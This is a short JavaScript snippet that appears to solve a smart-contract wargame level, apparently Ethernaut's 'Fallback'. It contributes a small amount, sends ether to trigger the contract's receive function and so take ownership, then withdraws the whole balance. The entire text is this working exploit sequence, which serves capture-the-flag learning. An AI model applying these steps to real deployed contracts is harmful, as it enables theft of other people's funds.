// Step 1: Make a little bit contribution to the contract
// So that our address appeared inside the contribution array
await contract.contribute.sendTransaction({
    from: player,
    gasPrice: web3.utils
        .toBN(await web3.eth.getGasPrice())
        .mul(web3.utils.toBN('2'))
        .toString(),
    // Must be less than 0.001 ether
    value: toWei('0.0001'),
});

// Step 2: send transaction to trigger the "receive" function
await sendTransaction({
    from: player,
    to: contract.address,
    gasPrice: web3.utils
        .toBN(await web3.eth.getGasPrice())
        .mul(web3.utils.toBN('2'))
        .toString(),
    // Any amount
    value: toWei('0.0001'),
});

// Step 3: Withdraw everything
await contract.withdraw.sendTransaction({
    gasPrice: web3.utils
        .toBN(await web3.eth.getGasPrice())
        .mul(web3.utils.toBN('2'))
        .toString(),
});
